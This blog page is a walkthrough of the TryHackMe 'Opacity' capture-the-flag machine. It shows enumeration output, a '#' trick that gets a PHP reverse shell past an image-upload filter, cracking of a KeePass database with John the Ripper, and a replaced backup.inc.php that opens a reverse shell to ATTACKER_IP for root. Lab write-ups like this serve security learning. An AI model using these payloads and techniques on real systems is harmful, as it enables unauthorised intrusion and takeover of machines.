<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>TryHackMe: Opacity write-up - bughunter.me</title><meta name="description" content="In this article, we're gonna dive into the solution for the 'Opacity' challenge. Our goal is to bypass a file-upload filter and exploit Linux permissions&hellip;"><meta name="generator" content="Publii Open-Source CMS for Static Site"><meta name="theme-color" content="#17181E" media="(prefers-color-scheme: dark)"><meta name="theme-color" content="#D73A42" media="(prefers-color-scheme: light)"><meta name="msapplication-navbutton-color" content="#D73A42"><meta name="apple-mobile-web-app-status-bar-style" content="#D73A42"><link rel="canonical" href="https://e4ld3rs0n.github.io/bughunter-publii/tryhackme-opacity-write-up/"><link rel="alternate" type="application/atom+xml" href="https://e4ld3rs0n.github.io/bughunter-publii/feed.xml"><link rel="alternate" type="application/json" href="https://e4ld3rs0n.github.io/bughunter-publii/feed.json"><meta property="og:title" content="TryHackMe: Opacity write-up"><meta property="og:image" content="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/8/tryhackme-banner.jpg"><meta property="og:image:width" content="800"><meta property="og:image:height" content="440"><meta property="og:site_name" content="bughunter.me"><meta property="og:description" content="In this article, we're gonna dive into the solution for the 'Opacity' challenge. Our goal is to bypass a file-upload filter and exploit Linux permissions&hellip;"><meta property="og:url" content="https://e4ld3rs0n.github.io/bughunter-publii//tryhackme-opacity-write-up/"><meta property="og:type" content="article"><link rel="preload" href="https://e4ld3rs0n.github.io/bughunter-publii/assets/dynamic/fonts/redhatmono/redhatmono.woff2" as="font" type="font/woff2" crossorigin><link rel="preload" href="https://e4ld3rs0n.github.io/bughunter-publii/assets/dynamic/fonts/redhatmono/redhatmono-italic.woff2" as="font" type="font/woff2" crossorigin><link rel="stylesheet" href="https://e4ld3rs0n.github.io/bughunter-publii/assets/css/style.css?v=8e333f6e7150e374fed5e317e5a6269e"><script type="application/ld+json">{"@context":"http://schema.org","@type":"Article","mainEntityOfPage":{"@type":"WebPage","@id":"https://e4ld3rs0n.github.io/bughunter-publii/tryhackme-opacity-write-up/"},"headline":"TryHackMe: Opacity write-up","datePublished":"2023-04-11T07:10+02:00","dateModified":"2025-01-26T18:12+01:00","image":{"@type":"ImageObject","url":"https://e4ld3rs0n.github.io/bughunter-publii/media/posts/8/tryhackme-banner.jpg","height":440,"width":800},"description":"In this article, we're gonna dive into the solution for the 'Opacity' challenge. Our goal is to bypass a file-upload filter and exploit Linux permissions&hellip;","author":{"@type":"Person","name":"andrey","url":"https://e4ld3rs0n.github.io/bughunter-publii/authors/andrey/"},"publisher":{"@type":"Organization","name":"andrey"}}</script><noscript><style>img[loading] {
                    opacity: 1;
                }</style></noscript></head><body class="post-template"><div class="container container--center"><header class="header"><div class="header__logo"><a class="logo" href="https://e4ld3rs0n.github.io/bughunter-publii/">bughunter.me</a></div><nav class="navbar js-navbar"><button class="navbar__toggle js-toggle" aria-label="Menu" aria-haspopup="true" aria-expanded="false"><span class="navbar__toggle-box"><span class="navbar__toggle-inner">Menu</span></span></button><ul class="navbar__menu"><li><a href="https://e4ld3rs0n.github.io/bughunter-publii/tags/blog/" target="_self">blog</a></li><li><a href="https://e4ld3rs0n.github.io/bughunter-publii/tags/homelab/" target="_self">homelab</a></li><li><a href="https://e4ld3rs0n.github.io/bughunter-publii/tags/ctf/" target="_self">ctf</a></li><li><a href="https://e4ld3rs0n.github.io/bughunter-publii/about-me/" title="About this blog" target="_self">whoami</a></li><li><a href="https://e4ld3rs0n.github.io/bughunter-publii/privacy-policy/" target="_self">privacy-policy</a></li><li><a href="https://e4ld3rs0n.github.io/bughunter-publii//feed.xml" target="_self">rss-feed</a></li></ul></nav></header><main class="content"><article class="post"><header><h1 class="post__title">TryHackMe: Opacity write-up</h1><div class="post__meta"><time datetime="2023-04-11T07:10" class="post__date">Tuesday, 11 April 2023 </time><span class="post__author"><a href="https://e4ld3rs0n.github.io/bughunter-publii/authors/andrey/" class="feed__author">andrey</a></span></div><div class="post__tags"><a href="https://e4ld3rs0n.github.io/bughunter-publii/tags/ctf/" class="invert">ctf</a> <a href="https://e4ld3rs0n.github.io/bughunter-publii/tags/tryhackme/" class="invert">tryhackme</a></div></header><figure class="post__image post__cover"><img src="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/8/tryhackme-banner.jpg" srcset="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/8/responsive/tryhackme-banner-xs.jpg 300w, https://e4ld3rs0n.github.io/bughunter-publii/media/posts/8/responsive/tryhackme-banner-sm.jpg 480w, https://e4ld3rs0n.github.io/bughunter-publii/media/posts/8/responsive/tryhackme-banner-md.jpg 768w, https://e4ld3rs0n.github.io/bughunter-publii/media/posts/8/responsive/tryhackme-banner-lg.jpg 1024w" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" loading="eager" height="440" width="800" alt=""></figure><div class="post__entry"><p></p><p>In this article, we're gonna dive into the solution for the "Opacity" challenge. Our goal is to bypass a file-upload filter and exploit Linux permissions to get root access.</p><p></p><p></p><p>Link <a href="https://tryhackme.com/room/opacity" target="_blank" rel="noreferrer noopener">https://tryhackme.com/room/opacity</a></p><p></p><p></p><p>Difficulty: <code>Easy</code></p><p></p><p></p><p>Authors: <code>tryhackme</code>, <code>mindsflee</code></p><p></p><p></p><h2 class="wp-block-heading">Initial enumeration</h2><p></p><p></p><p>First, we need to map the machine's IP address to opacity.thm in our hosts file and do an Nmap scan, which reveals the following information:</p><p></p><p></p><pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">...Discovered open port 22/tcp on 10.10.13.142Discovered open port 80/tcp on 10.10.13.142Discovered open port 139/tcp on 10.10.13.142Discovered open port 445/tcp on 10.10.13.142...</pre><p></p><p></p><p>We discovered an SSH service, a web server, and an SMB service running on the machine. I started the enumeration with enum4linux, but it didn't provide any interesting information. So, I moved on to the web app. Opening opacity.thm in the browser led me to a login page. A review of the source code didn't reveal anything significant, and there was no robots.txt file to guide us to other app pages. I then used GoBuster, which produced these results:</p><p></p><p></p><pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">===============================================================2023/04/10 12:36:26 Starting gobuster in directory enumeration mode===============================================================/index.php            (Status: 302) [Size: 0] [--&gt; login.php]/login.php            (Status: 200) [Size: 848]              /css                  (Status: 301) [Size: 308] [--&gt; http://opacity.thm/css/]/logout.php           (Status: 302) [Size: 0] [--&gt; login.php]                /cloud                (Status: 301) [Size: 310] [--&gt; http://opacity.thm/cloud/]</pre><p></p><p></p><h2 class="wp-block-heading">Web service exploit and initial access</h2><p></p><p></p><p>Heading to <code>http://opacity.thm/cloud</code>, we find an image upload service. It needs a URL to upload the image from, which is then saved it in the /cloud/images directory. We might be able to use this to upload a reverse shell script instead of an image.</p><p></p><p></p><p>I downloaded pentestmonkey's reverse shell and configured the IP and port parameters and then set up a Python3 HTTP server on my machine. When I attempted to upload the shell, I received an error message saying, "Please select an image." In contrast, uploading a standard PNG image proceeded without any problems. This led me to conclude that the web app filters files according to their extensions.</p><p></p><p></p><p>To gain a better understanding of how the service works, I started a netcat listener and directed the website to it. Here is the output:</p><p></p><p></p><pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">$ nc -vlnp 8000listening on [any] 8000 ...connect to [10.8.46.10] from (UNKNOWN) [10.10.99.102] 37516GET /demo.png HTTP/1.1User-Agent: Wget/1.20.3 (linux-gnu)Accept: */*Accept-Encoding: identityHost: 10.8.46.10:8000Connection: Keep-Alive</pre><p></p><p></p><p>Checking the User-Agent field in the headers, it looks like the web app uses wget to download the images. We can guess that the app makes a system call to wget and passes the URL as an argument.</p><p></p><p></p><p>Let's try to bypass the filter by using a '#' symbol at the end of the upload URL and adding some fake image filename at the end, like this: http://YOUR_IP/revshell.php#img.jpg</p><p></p><p></p><p>This string will get past the filter because it technically has a valid image extension at the end. However, when passed to wget, this string will be truncated at the # sign (which is a comment in a shell script) and everything after # will be ignored.</p><p></p><p></p><p>All we have to do now is open a netcat listener on our machine, go to <a href="http://opacity.thm/cloud/images/revshell.php">http://opacity.thm/cloud/images/revshell.php</a>, and bam! We get an initial shell on the target machine as www-data.</p><p></p><p></p><h2 class="wp-block-heading">Lateral movement and first flag</h2><p></p><p></p><p>After taking a look in the /home directory and /passwd file, I noticed that there is one user on the system, sysadmin. Inside his home directory, I found the user flag and an interesting directory called scripts, both of which are inaccessible to www-data.</p><p></p><p></p><p>As I continued to explore the system, I discovered a suspicious file, /opt/dataset.kdbx. I set up a quick Python web server on the target machine and downloaded the file to my machine. We now have a KeePass database file, which is great because we can attempt to crack its master password.</p><p></p><p></p><p>To do this, I used the keepass2john utility to convert the database file into a hash file for John the Ripper, a popular open-source password cracking tool. Then, I ran John to start the password cracking process:</p><p></p><p></p><pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">$ keepass2john dataset.kdbx &gt; forjohn$ john --wordlist=/usr/share/wordlists/rockyou.txt forjohnLoaded 1 password hash (KeePass [SHA256 AES 32/64 OpenSSL])Proceeding with single, rules:SinglePress 'q' or Ctrl-C to abort, almost any other key for status7418*****          (dataset.kdbx)1g 0:00:00:02 DONE 1/3 (2023-04-10 14:32) 0.4782g/s 6842Kp/s 6842Kc/s 6842KC/s  12345678..987654321Use the "--show" option to display all of the cracked passwords reliablySession completed</pre><p></p><p></p><p>Upon successfully accessing the KeePass database, I discovered the password for the 'sysadmin' user. With this information, we can now securely log into the target system using SSH, which provides a more stable and reliable shell compared to the reverse PHP shell we had earlier. Once logged in, we can examine the contents of the 'scripts' directory associated with the 'sysadmin' user and get the user flag.</p><p></p><p></p><h2 class="wp-block-heading">Root access</h2><p></p><p></p><p>I proceeded to upload pspy onto the machine and began examining the script.php file located within the "scripts" directory. Pspy disclosed that the root user runs /home/sysadmin/scripts/script.php every 5 minutes.</p><p></p><p></p><p>A review of the code revealed that the script carries out two tasks: firstly, it compresses the contents of the "scripts" directory and saves the resulting archive as /var/backups/backup.zip; secondly, it removes all files contained in /var/www/html/cloud/images.</p><p></p><p></p><p>The custom zipData() function in script.php presents a promising opportunity for exploitation to obtain root access. This function is defined in the lib/backup.inc.php file. However, due to insufficient permissions, it appears that we are unable to modify either script.php or backup.inc.php:</p><p></p><p></p><pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">sysadmin@opacity:~/scripts$ ls -alhtotal 16Kdrwxr-xr-x 3 root     root     4.0K Jul  8  2022 .drwxr-xr-x 6 sysadmin sysadmin 4.0K Feb 22 08:16 ..drwxr-xr-x 2 sysadmin root     4.0K Jul 26  2022 lib-rw-r----- 1 root     sysadmin  519 Jul  8  2022 script.phpsysadmin@opacity:~/scripts$ ls -alh libtotal 132Kdrwxr-xr-x 2 sysadmin root 4.0K Jul 26  2022 .drwxr-xr-x 3 root     root 4.0K Jul  8  2022 ..-rw-r--r-- 1 root     root 9.3K Jul 26  2022 application.php-rw-r--r-- 1 root     root  967 Jul  6  2022 backup.inc.php-rw-r--r-- 1 root     root  24K Jul 26  2022 bio2rdfapi.php-rw-r--r-- 1 root     root  11K Jul 26  2022 biopax2bio2rdf.php-rw-r--r-- 1 root     root 7.5K Jul 26  2022 dataresource.php-rw-r--r-- 1 root     root 4.8K Jul 26  2022 dataset.php-rw-r--r-- 1 root     root 3.2K Jul 26  2022 fileapi.php-rw-r--r-- 1 root     root 1.3K Jul 26  2022 owlapi.php-rw-r--r-- 1 root     root 1.5K Jul 26  2022 phplib.php-rw-r--r-- 1 root     root  11K Jul 26  2022 rdfapi.php-rw-r--r-- 1 root     root  17K Jul 26  2022 registry.php-rw-r--r-- 1 root     root 6.8K Jul 26  2022 utils.php-rwxr-xr-x 1 root     root 3.9K Jul 26  2022 xmlapi.php</pre><p></p><p></p><p>What we <strong>can</strong> modify is the lib directory itself as we are the owner and have read, write, and execute permissions for it. I proceeded to copy the contents of the backup.inc.php file, delete the original file, and create a new version of backup.inc.php containing a reverse shell:</p><p></p><p></p><pre class="EnlighterJSRAW" data-enlighter-language="php" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">&lt;?phpini_set('max_execution_time', 600);ini_set('memory_limit', '1024M');function zipData($source, $destination) {        $sock=fsockopen("ATTACKER_IP",9001);        system("sh &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");}?&gt;</pre><p></p><p></p><p>Subsequently, I set up a netcat listener on my local machine, and after a brief period, I successfully received a connection back as the root user:</p><p></p><p></p><pre class="EnlighterJSRAW" data-enlighter-language="bash" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">nc -vlnp 9001Listening on [0.0.0.0] (family 0, port 9001)Connection from [10.10.13.142] port 9001 [tcp/*] accepted (family 2, sport 56789)iduid=0(root) gid=0(root) groups=0(root)lsproof.txtsnapcat proof.txt[REDACTED]</pre><p></p><p></p><h2 class="wp-block-heading">Conclusion</h2><p></p><p></p><p>In this article, we delved into the "Opacity" challenge, showcasing the process of bypassing a file-upload filter and exploiting Linux permissions to gain root access. Through careful enumeration of the target system, we managed to outsmart the file extension filter and cracked a KeePass database to obtain the 'sysadmin' password. By abusing a custom PHP function we ultimately achieved root access.</p><p></p></div><footer class="wrapper post__footer"><p class="post__last-updated">This article was updated on Sunday, 26 January 2025</p><div class="post__share"><a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fe4ld3rs0n.github.io%2Fbughunter-publii%2Ftryhackme-opacity-write-up%2F" class="js-share invert facebook" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://e4ld3rs0n.github.io/bughunter-publii/assets/svg/svg-map.svg#facebook"/></svg> <span>Facebook</span> </a><a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fe4ld3rs0n.github.io%2Fbughunter-publii%2Ftryhackme-opacity-write-up%2F" class="js-share invert linkedin" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://e4ld3rs0n.github.io/bughunter-publii/assets/svg/svg-map.svg#linkedin"/></svg> <span>LinkedIn</span> </a><a href="https://api.whatsapp.com/send?text=TryHackMe%3A%20Opacity%20write-up https%3A%2F%2Fe4ld3rs0n.github.io%2Fbughunter-publii%2Ftryhackme-opacity-write-up%2F" class="js-share invert whatsapp" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://e4ld3rs0n.github.io/bughunter-publii/assets/svg/svg-map.svg#whatsapp"/></svg> <span>WhatsApp</span></a></div></footer><nav class="pagination"><div class="pagination__title"><span>Read other posts</span></div><div class="pagination__buttons"><a href="https://e4ld3rs0n.github.io/bughunter-publii/tryhackme-eavesdropper-write-up/" class="btn previous" rel="prev" aria-label="[MISSING TRANSLATION]:  TryHackMe: Eavesdropper write-up "><span class="btn__icon">←</span> <span class="btn__text">TryHackMe: Eavesdropper write-up</span> </a><a href="https://e4ld3rs0n.github.io/bughunter-publii/tryhackme-internal-write-up/" class="btn next" rel="next" aria-label="[MISSING TRANSLATION]:  TryHackMe: Internal write-up "><span class="btn__text">TryHackMe: Internal write-up</span> <span class="btn__icon">→</span></a></div></nav></article><div class="post__comments"></div></main><footer class="footer"><div class="footer__inner"><div class="footer__copyright"><p>© 2023 - 2025 BugHunter</p></div></div></footer></div><script defer="defer" src="https://e4ld3rs0n.github.io/bughunter-publii/assets/js/scripts.min.js?v=c2232aa7558e9517946129d2a1b8c770"></script><script>window.publiiThemeMenuConfig={mobileMenuMode:'overlay',animationSpeed:300,submenuWidth: 'auto',doubleClickTime:500,mobileMenuExpandableSubmenus:true,relatedContainerForOverlayMenuSelector:'.top'};</script><script>var images = document.querySelectorAll('img[loading]');
        for (var i = 0; i < images.length; i++) {
            if (images[i].complete) {
                images[i].classList.add('is-loaded');
            } else {
                images[i].addEventListener('load', function () {
                    this.classList.add('is-loaded');
                }, false);
            }
        }</script><script>class Rot18Encoder { constructor() { this.rotations = [ { from: 'a', to: 'z', offset: 18 }, { from: 'A', to: 'Z', offset: 18 }, { from: '0', to: '9', offset: 5 } ]; } _rotate(char, from, to, offset) { const charCode = char.charCodeAt(0); const fromCode = from.charCodeAt(0); const toCode = to.charCodeAt(0); const range = toCode - fromCode + 1; if (charCode >= fromCode && charCode <= toCode) { const shiftedCode = ((charCode - fromCode + offset) % range) + fromCode; return String.fromCharCode(shiftedCode); } return char; } encode(text) { let encodedText = ""; for(let char of text){ let rotatedChar = char; for (const rot of this.rotations){ rotatedChar = this._rotate(rotatedChar, rot.from, rot.to, rot.offset); } encodedText += rotatedChar; } return encodedText; } decode(text) { let decodedText = ""; for(let char of text){ let rotatedChar = char; for (const rot of this.rotations){ rotatedChar = this._rotate(rotatedChar, rot.from, rot.to, rot.to.charCodeAt(0) - rot.from.charCodeAt(0) + 1 - rot.offset); } decodedText += rotatedChar; } return decodedText; } } class TextProcessor { constructor(encoder){ this.encoder = encoder; } encode(text){ return this.encoder.encode(text); } decode(text){ return this.encoder.decode(text); } } document.addEventListener('DOMContentLoaded', function() { const rot18 = new Rot18Encoder(); const coder = new TextProcessor(rot18); var obfElements = document.querySelectorAll('.obfuscated-email'); obfElements.forEach(function(elem) { var dataType = elem.getAttribute('data-type'); var encodedEmail = elem.getAttribute('data-email'); var user = elem.getAttribute('data-user'); var domain = elem.getAttribute('data-domain'); var decodedEmail = ''; if (user && domain) { decodedEmail = coder.decode(user) + '@' + coder.decode(domain); } else if (encodedEmail) { const parts = encodedEmail.split('@'); if (parts.length === 2) { decodedEmail = coder.decode(parts[0]) + '@' + coder.decode(parts[1]); } else { decodedEmail = encodedEmail; } } if (dataType === 'mailto') { var originalText = elem.textContent.trim(); var a = document.createElement('a'); a.href = 'mailto:' + decodedEmail; if (elem.classList.length > 0) { a.className = elem.className; } if (originalText === '') { a.textContent = decodedEmail; } else { a.textContent = originalText; } elem.parentNode.replaceChild(a, elem); } else if (dataType === 'text') { var textNode = document.createTextNode(decodedEmail); elem.parentNode.replaceChild(textNode, elem); } }); });</script></body></html>